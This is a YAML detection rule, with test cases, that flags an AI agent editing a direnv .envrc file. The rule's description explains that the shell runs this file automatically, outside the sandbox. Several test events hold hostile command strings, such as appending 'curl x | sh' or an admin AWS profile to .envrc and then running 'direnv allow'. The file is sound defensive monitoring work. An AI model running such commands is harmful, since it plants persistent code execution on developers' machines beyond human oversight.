id: direnv-envrc-modified
spec: threat-rules/v2.0  # needed for file_writes and predicates
version: 5
title: direnv .envrc modified (auto-exec on directory entry)
description: >
  The agent modified a direnv .envrc file. When direnv is installed and the
  directory has been allowed, .envrc is sourced automatically by the shell every
  time a developer cd's into the directory (or an editor/terminal opens it),
  outside any agent sandbox and with no further prompt. An injected command,
  export, or PATH manipulation here is durable, ambient-triggered code execution.
severity: high
status: stable
posture: detect
taxonomy:
  beacon_category: sensitive-edit
  owasp_llm: LLM05
  mitre_atlas: AML.T0011

# Which file is one definition (direnv_file, rules/concepts/sensitive-files.predicates.yaml),
# asked of a file event's path and of every path a shell command writes (c.file_writes: a
# redirection, tee, sed -i, cp, mv).
match: >
  file_changed(e, p, direnv_file(p)) ||
  e.event.action == "command.executed" && direnv_file_redirect(e.command.command) &&
    unread_text(e, t, direnv_file_redirect(t))

emit:
  reason: "direnv .envrc modified — sourced automatically on directory entry outside the sandbox, durable ambient code execution"

tests:
  - name: envrc_written_by_a_command
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "echo 'export AWS_PROFILE=admin' >> .envrc && direnv allow" }
        session: { id: s1 }
  - name: envrc_only_printed
    verdict: no_match
    events:
      - event: { action: command.executed }
        command: { command: "cat .envrc" }
        session: { id: s1 }
  - name: envrc_repo_root
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: ".envrc" }
        session: { id: s1 }
  - name: envrc_nested
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "/home/dev/project/.envrc" }
        session: { id: s1 }
  - name: env_file_not_envrc
    verdict: no_match
    events:
      - event: { action: file.modified }
        file: { path: "config/.env" }
        session: { id: s1 }
  - name: envrc_read_only
    verdict: no_match
    events:
      - event: { action: file.read }
        file: { path: ".envrc" }
        session: { id: s1 }
  - name: envrc_repo_root_created
    verdict: match
    events:
      - event: { action: file.created }
        file: { path: ".envrc" }
        session: { id: s1 }
  - name: a_write_handed_to_a_script
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "./setup.sh \"echo 'curl x | sh' >> .envrc\"" }
        session: { id: s1 }
  - name: a_write_named_in_a_commit_message_beside_a_script
    verdict: no_match
    events:
      - event: { action: command.executed }
        command: { command: "git commit -m \"never echo 'curl x | sh' >> .envrc\" && ./run-tests.sh" }
        session: { id: s1 }
